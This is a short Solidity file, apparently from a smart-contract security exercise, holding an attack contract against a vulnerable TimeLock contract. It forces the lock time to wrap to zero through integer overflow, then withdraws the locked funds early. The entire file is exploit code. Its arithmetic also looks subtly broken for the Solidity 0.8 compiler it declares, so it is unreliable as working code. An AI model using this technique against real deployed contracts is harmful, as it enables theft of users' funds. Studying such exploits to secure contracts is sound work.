// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "vuln_timelock.sol";

contract AttackTimeLock {
    TimeLock public timeLock;

    constructor (address timeLockAddress) {
        timeLock = TimeLock(timeLockAddress);
    }

    function unlockVault() public {
        uint locktime = timeLock.lockTime(address(this));
        timeLock.increaseLockTime(2 ** 256 - locktime);
    }

    function withdraw() public {
        timeLock.withdraw();
    }
}
